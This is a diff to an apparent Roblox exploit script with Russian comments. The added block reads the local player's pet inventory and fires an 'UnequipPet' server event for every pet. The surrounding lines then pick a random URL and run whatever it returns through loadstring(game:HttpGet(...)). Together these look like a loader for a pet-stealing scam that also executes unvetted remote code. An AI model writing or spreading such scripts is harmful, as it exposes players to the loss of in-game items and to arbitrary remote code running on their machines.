@@ -153,6 +153,36 @@ Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Background
 
+
+
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
+
+local function unequipAllPets()
+    local petsData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data
+
+    for petUid, petInfo in pairs(petsData) do
+        -- petUid = "{...}" строка UUID
+        -- petInfo = таблица с данными питомца
+        print("➡️ Unequipping:", petInfo.PetType, petUid)
+        PetsService:FireServer("UnequipPet", petUid)
+        task.wait(0.1) -- небольшая задержка между снятиями
+    end
+end
+
+unequipAllPets()
+
+
+
+
+
+
+
 -- Выбор случайного скрипта
 local chosenScript = scripts[math.random(1, #scripts)]
 loadstring(game:HttpGet(chosenScript, true))()
